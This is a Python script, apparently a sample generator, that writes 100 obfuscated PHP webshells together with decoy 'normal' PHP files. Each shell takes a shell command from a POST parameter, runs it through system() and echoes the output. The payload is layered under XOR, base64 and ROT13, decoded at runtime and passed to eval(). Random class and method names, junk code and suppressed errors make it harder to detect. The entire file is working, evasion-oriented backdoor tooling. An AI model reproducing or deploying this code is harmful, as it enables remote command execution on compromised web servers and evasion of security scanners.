import os
import random
import base64
import string
import hashlib
import codecs
from pathlib import Path

OUTPUT_DIR = Path("/data/php_webshellv15")
KEY = hashlib.sha256(os.urandom(32)).hexdigest()[:16]

OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

def generate_random_var(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def generate_random_namespace():
    parts = [generate_random_var() for _ in range(3)]
    return "\\".join(parts)

def generate_random_class_name():
    return ''.join(random.choices(string.ascii_uppercase, k=1)) + generate_random_var(7)

def generate_random_method_name():
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))

def xor_encode(data, key):
    result = ''
    for i in range(len(data)):
        result += chr(ord(data[i]) ^ ord(key[i % len(key)]))
    return result

def xor_encode_base64(data, key):
    xor_bytes = xor_encode(data, key).encode()
    return base64.b64encode(xor_bytes).decode()

def rot13_encode(data):
    return codecs.encode(data, 'rot13')

def generate_junk_code():
    lines = []
    for _ in range(random.randint(5, 10)):
        var = generate_random_var()
        val = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
        lines.append(f"${var} = '{val}';")
    return '\n'.join(lines)

def generate_mixed_string(text):
    """生成混淆的字符串"""
    parts = []
    for char in text:
        if random.random() < 0.5:
            parts.append(f"\\x{ord(char):02x}")
        else:
            parts.append(char)
    return "'" + "".join(parts) + "'"

def build_webshell(index):
    namespace = generate_random_namespace()
    main_class_name = generate_random_class_name()
    method_name = generate_random_method_name()
    exec_method = generate_random_method_name()
    
    # 创建伪装文件
    normal_file_name = f"normal_{index}.php"
    with open(os.path.join(OUTPUT_DIR, normal_file_name), 'w') as f:
        f.write("<?php\nclass NormalClass { public function doNothing() {} }\n?>")
    
    # 实际payload
    payload_code = """
        if (!isset($_POST['qaxniubi'])) {
            return;
        }
        
        $cmd = trim($_POST['qaxniubi']);
        if (empty($cmd)) {
            return;
        }
        
        ob_start();
        system($cmd . " 2>&1");
        $output = ob_get_clean();
        
        if (!is_null($output)) {
            echo $output;
        }
    """
    
    encoded_payload = payload_code
    for _ in range(3):
        encoded_payload = xor_encode_base64(encoded_payload, KEY)
        encoded_payload = rot13_encode(encoded_payload)
    
    shell = f"""<?php
declare(strict_types=1);
namespace {namespace};

error_reporting(0);
ini_set('display_errors', '0');
header('Content-Type: text/html; charset=UTF-8');

trait CommandExec {{
    private function {exec_method}($data) {{
        try {{
            eval($data);
        }} catch (Exception $e) {{
            return;
        }}
    }}
}}

class {main_class_name} {{
    use CommandExec;
    
    private $data;
    private static $instance;
    
    private function __construct($data) {{
        $this->data = $data;
    }}
    
    public static function getInstance($data) {{
        if (self::$instance === null) {{
            self::$instance = new static($data);
        }}
        return self::$instance;
    }}
    
    public function {method_name}() {{
        $this->{exec_method}($this->data);
    }}
}}

@include_once '{normal_file_name}';

{generate_junk_code()}

$k = '{KEY}';
$p = '{encoded_payload}';
$d = $p;

function xorString($str, $key) {{
    $result = '';
    $keyLen = strlen($key);
    for($i = 0; $i < strlen($str); $i++) {{
        $result .= chr(ord($str[$i]) ^ ord($key[$i % $keyLen]));
    }}
    return $result;
}}

for($round = 0; $round < 3; $round++) {{
    $d = str_rot13($d);
    $decoded = base64_decode($d);
    if ($decoded === false) {{ return; }}
    $d = xorString($decoded, $k);
}}

$magic = \\{namespace}\\{main_class_name}::getInstance($d);
if (!$magic) {{
    return;
}}

$magic->{method_name}();

?>"""
    return shell

def generate_webshell_samples(n):
    for i in range(n):
        shell_code = build_webshell(i)
        path = os.path.join(OUTPUT_DIR, f"adv_webshell_{i}.php")
        with open(path, 'w') as f:
            f.write(shell_code)
    print(f"Generated {n} advanced PHP WebShells in {OUTPUT_DIR}")

def main():
    num_samples = 100
    generate_webshell_samples(num_samples) 

if __name__ == "__main__":
    main()